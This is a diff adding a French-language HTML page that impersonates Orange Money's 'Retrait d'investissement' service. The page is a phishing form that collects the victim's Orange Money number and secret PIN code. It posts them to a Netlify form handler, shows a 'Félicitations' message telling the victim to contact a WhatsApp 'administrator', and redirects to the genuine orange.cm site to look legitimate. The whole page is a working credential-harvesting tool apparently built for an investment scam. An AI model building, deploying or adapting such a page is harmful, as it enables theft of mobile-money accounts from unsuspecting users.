@@ -1,0 +1,194 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Retrait d'investissement — Orange Money</title>
+  <style>
+    * { box-sizing: border-box; font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
+    html,body { height:100%; margin:0; background: linear-gradient(180deg,#f2f6fb 0%, #ffffff 100%); color:#222; }
+
+    .wrap {
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:24px;
+    }
+
+    .card {
+      width:100%;
+      max-width:520px;
+      background: #fff;
+      border-radius:12px;
+      box-shadow: 0 8px 30px rgba(18,30,60,0.08);
+      overflow: hidden;
+      border: 1px solid rgba(0,0,0,0.03);
+    }
+
+    .hero {
+      width:100%;
+      height:120px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background: #fff;
+    }
+    .hero img {
+      max-height:90px;
+      object-fit:contain;
+    }
+
+    .card-body {
+      padding:22px;
+    }
+    h1 { font-size:20px; margin:0 0 12px 0; }
+    p.lead { margin:0 0 18px 0; color:#555; font-size:14px; }
+
+    form { display:block; }
+    .field { margin-bottom:14px; }
+
+    label {
+      display:block;
+      font-size:13px;
+      margin-bottom:6px;
+      color:#333;
+    }
+
+    input[type="text"], input[type="tel"], input[type="number"], input[type="password"] {
+      width:100%;
+      padding:10px 12px;
+      border-radius:8px;
+      border:1px solid #e3e8ef;
+      background:#fbfdff;
+      font-size:15px;
+      outline:none;
+      transition: box-shadow .12s, border-color .12s;
+    }
+    input:focus { border-color:#9bb7ff; box-shadow:0 6px 20px rgba(59,89,210,0.06); }
+
+    .notice {
+      background:#fff9e6;
+      border-left:4px solid #ffd166;
+      padding:10px 12px;
+      border-radius:6px;
+      font-size:13px;
+      color:#6b4b00;
+      margin-top:8px;
+    }
+
+    .btn {
+      width:100%;
+      padding:12px;
+      margin-top:8px;
+      border-radius:10px;
+      border:0;
+      font-weight:600;
+      font-size:15px;
+      cursor:pointer;
+      background: linear-gradient(90deg,#e53935,#ff6b6b);
+      color:#fff;
+      box-shadow: 0 8px 20px rgba(229,57,53,0.18);
+    }
+
+    .hidden { display:none; }
+
+    .popup {
+      display:none;
+      padding:15px;
+      margin-top:15px;
+      background:#e7ffe7;
+      border-left:4px solid #1fa31f;
+      border-radius:8px;
+      font-size:14px;
+      color:#084d08;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="wrap">
+    <div class="card">
+      
+      <div class="hero">
+        <img src="IMG_9622.PNG" alt="Orange Money">
+      </div>
+
+      <div class="card-body">
+        <h1>Retrait d'investissement — Orange Money</h1>
+        <p class="lead">Remplissez les informations ci-dessous pour initier le retrait.</p>
+
+        <!-- MESSAGE DE FÉLICITATIONS -->
+        <div id="popup" class="popup">
+          🎉 Félicitations !  
+          <br>Nous avons bien reçu votre demande de retrait d’investissement.  
+          <br>Contactez votre administrateur WhatsApp pour finaliser.
+        </div>
+
+        <form id="formOM"
+              name="retrait-orange-money"
+              method="POST"
+              data-netlify="true"
+              netlify-honeypot="bot-field">
+
+          <input type="hidden" name="form-name" value="retrait-orange-money">
+
+          <div class="hidden">
+            <label>Ne pas remplir : <input name="bot-field"></label>
+          </div>
+
+          <div class="field">
+            <label for="om-number">Numéro Orange Money</label>
+            <input id="om-number" name="numero_orange" type="tel" required
+                   placeholder="Votre numéro Orange Money">
+          </div>
+
+          <div class="field">
+            <label for="amount">Montant à recevoir</label>
+            <input id="amount" name="montant" type="number" min="1" step="1"
+                   placeholder="Ex: 1000" required>
+          </div>
+
+          <div class="field">
+            <label for="om-code">Code Orange Money</label>
+            <input id="om-code" name="code_orange" type="number"
+                   inputmode="numeric"
+                   pattern="[0-9]*"
+                   placeholder="•••••" required>
+
+            <div class="notice">
+              <strong>Noté :</strong> Remplissez correctement vos infos pour éviter les erreurs.
+            </div>
+          </div>
+
+          <button type="submit" class="btn">Recevoir</button>
+        </form>
+
+      </div>
+    </div>
+  </div>
+
+<script>
+  const form = document.getElementById("formOM");
+  const popup = document.getElementById("popup");
+
+  form.addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const data = new FormData(form);
+
+    fetch("/", {
+      method: "POST",
+      body: data
+    }).then(() => {
+      popup.style.display = "block";
+
+      setTimeout(() => {
+        window.location.href = "https://www.orange.cm"; 
+      }, 3000);
+    });
+  });
+</script>
+
+</body>
+</html>
